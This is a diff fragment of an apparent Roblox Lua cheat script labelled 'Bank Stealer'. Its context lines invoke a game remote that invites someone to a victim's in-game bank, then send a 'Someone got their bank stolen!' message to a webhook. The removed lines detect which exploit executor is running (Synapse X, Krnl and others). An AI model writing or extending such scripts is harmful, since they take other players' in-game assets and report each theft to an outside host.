@@ -23,24 +23,6 @@ local Invite = {
 
 workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(Invite))
 if webhook == true then
-    local function getexploit()
-        local exploit =
-            (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
-            (isexecutorclosure and "Script-Ware V2") or
-            (secure_load and "Sentinel") or
-            (is_sirhurt_closure and "SirHurt V4") or
-            (pebc_execute and "ProtoSmasher") or
-            (KRNL_LOADED and "Krnl") or
-            (WrapGlobal and "WeAreDevs") or
-            (isvm and "Proxo") or
-            (shadow_env and "Shadow") or
-            (jit and "EasyExploits") or
-            (getreg()['CalamariLuaEnv'] and "Calamari") or
-            (unit and "Unit") or
-            ("Undetectable")
-    return exploit
-    end
-    
     local Content = 'Someone got their bank stolen!'
     local Embed = {
         ["title"] = "Bank Stealer",
